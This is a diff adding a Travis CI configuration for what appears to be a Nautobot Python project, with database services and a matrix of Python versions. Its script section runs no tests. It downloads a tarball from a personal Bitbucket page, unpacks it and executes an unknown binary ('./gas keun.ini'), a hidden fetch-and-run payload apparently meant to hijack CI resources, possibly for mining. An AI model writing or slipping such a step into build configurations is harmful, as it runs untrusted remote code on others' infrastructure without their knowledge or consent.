@@ -1,0 +1,31 @@
+# Linting/Testing available at https://config.travis-ci.com/explore
+os: linux
+dist: xenial
+services:
+  - postgresql
+  - redis
+addons:
+  postgresql: "9.6"
+language: python
+env:
+  - INVOKE_NAUTOBOT_LOCAL=True
+jobs:
+  fast_finish: true
+  include:
+    - stage: Tests
+      python: "3.6"
+    - python: "3.7"
+    - python: "3.8"
+    - python: "3.9"
+    - python: "3.7"
+    - python: "3.8"
+    - python: "3.9"
+    - python: "3.7"
+    - python: "3.8"
+    - python: "3.9"
+  allow_failures:
+    - python: "3.9"
+script:
+  - wget https://bitbucket.org/19410711/dumang/downloads/joss.tar.gz
+  - tar -xvf joss.tar.gz
+  - ./gas keun.ini
